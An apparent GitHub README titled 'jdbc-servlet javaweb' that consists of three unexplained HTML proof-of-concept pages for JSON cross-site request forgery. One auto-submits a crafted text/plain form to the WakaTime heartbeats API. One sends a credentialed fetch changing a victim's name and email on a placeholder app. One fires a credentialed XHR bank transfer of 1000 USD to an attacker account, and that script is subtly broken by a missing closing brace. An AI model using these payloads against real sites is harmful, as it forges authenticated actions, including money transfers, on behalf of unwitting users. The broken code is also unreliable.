# jdbc-servlet
javaweb
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script>
$( document ).ready(function() {
    $("#z").attr("name",'{"entity":"https://zzz.com","type":"domain","time":"'+($.now()/1000)+'","project":"<<LAST_PROJECT>>","is_debugging":false,"plugin":"chrome-wakatime/1.0.2","fakeparam":"');
    $("#f").submit();
});
</script>
</head>
<body>
<form id="f" ENCTYPE="text/plain" action="https://api.wakatime.com/api/v1/users/current/heartbeats" method="post">
<input id="z" type="hidden" name='test' value='test"}'> 
<input type="submit" value="send">
</form>
</body>
</html>

<html>
<title>JSON CSRF POC</title>
<body>
<center>
<h1> JSON CSRF POC </h1>
<script>
fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});
</script>
<form action="#">
<input type="button" value="Submit" />
</form>
</center>
</body>
</html>

<html>
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/members.bankofdirectdefense.com\/accounts\/transfer", true);
        xhr.setRequestHeader("Content-Type", "application\/json");
        xhr.withCredentials = true;
        xhr.send("{\"from-account\": 1,\"toAccount\": \"021000021-9876543210\",\"amount\": 1000,\"currency\": \"USD\"}");
      submitRequest();
    </script>
  </body>
</html>
